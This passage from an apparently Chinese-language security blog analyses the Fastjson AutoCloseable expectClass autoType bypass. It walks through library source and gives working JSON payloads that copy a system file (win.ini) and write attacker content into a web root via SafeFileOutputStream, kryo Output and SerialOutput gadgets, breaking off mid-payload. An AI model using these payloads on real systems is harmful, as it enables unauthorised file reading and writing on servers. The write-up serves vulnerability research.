<p>往下，判断其是否为jsonType，若true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常</p>
<p>这也是过滤大多数JNDI注入Gadget的机制</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png"></p>
<p>最重点的是以下部分，这里当expectClass不为null时，就会判断我们的clazz是否为expectClass的子类，若它继承与expectClass的话，就会被添加到Mapping缓存中并返回该目标类，反之则抛出异常</p>
<p>这里解释的我们的恶意类必须要继承自expectClass类，只有目标类是expectClass类的子类时，才能通过这里的判断，后续反序列化即可造成恶意代码的执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png"></p>
<h4 id="BWFH9">小结</h4>

<blockquote>
<p>在我们的POC中定义了两个<code>@type</code></p>
</blockquote>
<p>第一个type进去什么事情都没有发生，它是作为第二个type类的expectClass传入的，而当第二个type类为第一个type的继承类，且他的setter&#x2F;getter或构造方法中存在危险方法时，即可被我们利用</p>
<h3 id="R1wmY">实际利用</h3>
我实在太菜了，不会自己寻找gadget，这里就直接从别的师傅那里看存在漏洞的地方了 嘤嘤嘤

<p>找到的是IntputStream和OutputStream，他们都是实现自AutoCloseable接口的</p>
<h4 id="h09Z1">复制文件（任意文件读取）</h4>
利用类：org.eclipse.core.internal.localstore.SafeFileOutputStream

<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看一下<code>SafeFileOutputStream</code>的源代码，在他的构造函数<code>public SafeFileOutputStream(String targetPath, String tempPath)</code>中，若targetPath文件不存在，且tempPath文件存在，就会把tempPath复制到targetPath中</p>
<p>利用其构造函数，我们可以实现特定web场景下的任意文件读取</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.eclipse.core.internal.localstore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.utils.FileUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> File temp;</span><br><span class="line">    <span class="keyword">protected</span> File target;</span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);</span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.commit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.target.delete();</span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));</span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));</span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);</span><br><span class="line">                    ((OutputStream)destination).close();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    FileUtil.safeClose(source);</span><br><span class="line">                    FileUtil.safeClose(destination);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.write(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var3;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据原理来写一个POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;tempPath\&quot;:\&quot;C://windows/win.ini\&quot;,\&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到成功读取文件内容并写入flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png"></p>
<h4 id="CdujD">写入文件</h4>
利用类：com.esotericsoftware.kryo.io.Output

<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>该类写入了提供了<code>setOutputStream</code>和<code>setBuffer</code>两个setter方法用来写入输入流，其中的buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其<code>flush()</code>方法，该方法将流写入一个文件内</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream May be null. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.outputStream = outputStream;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">    setBuffer(buffer, buffer.length);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, position);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    total += position;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>写入文件时，我们就可以考虑写入恶意文件</p>
<p>接下来我们就看，怎么样去触发这个<code>flush</code>函数了，通过查找用法查看，只有在<code>close()</code>和<code>require()</code>函数被调用时才会触发，其中<code>require</code>只有在调用write相关函数时才会被触发，存在着链子的思维</p>
<p>我们找到<code>ObjectOutputStream</code>类，其中它的内部类<code>BlockDataOutputStream</code>的构造函数，将<code>OutputStream</code>类型参数赋值给了out成员变量，而其中的<code>setBolockDataMode</code>函数调用了<code>drain</code>方法，<code>drain</code>中又调用了<code>out.write</code>方法，从而调用了<code>flush</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line"> <span class="built_in">this</span>.out = out;  </span><br><span class="line"> dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment"> * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment"> * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment"> * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment"> * mode.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line"> <span class="keyword">return</span> blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line"> drain();  </span><br><span class="line"> blkmode = mode;  </span><br><span class="line"> <span class="keyword">return</span> !blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment"> * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line"> <span class="keyword">return</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line"> writeBlockHeader(pos);  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line"> pos = <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>对于<code>setBlockDataMode</code>函数的调用，在<code>ObjectOutputStream</code>类的有参构造函数中就存在：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">     verifySubclass();  </span><br><span class="line">     bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line">     handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">     subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">     enableOverride = <span class="literal">false</span>;  </span><br><span class="line">     writeStreamHeader();  </span><br><span class="line">     bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line">     <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line">         debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">     debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是Fastjson优先获取ObjectOutputStream类的无参构造方法，只能找它的继承类来触发了</p>
<p>我们找到一个只有有参构造方法的类：<code>com.sleepycat.bind.serial.SerialOutput</code></p>
<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，它的有参构造方法，是使用了他父类<code>ObjectOutputStream</code>的有参构造方法，这就满足我们之前的要求了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line"> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="built_in">super</span>(out);  </span><br><span class="line"> <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line"> useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下，用到了Fastjson循环引用的技巧来调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;targetPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/hacked.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tempPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/test.txt&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,</span><br><span class="line">        <span class="string">&quot;buffer&quot;</span>: <span class="string">&quot;cHduZWQ=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputStream&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;position&quot;</span>: <span class="number">5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;close&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        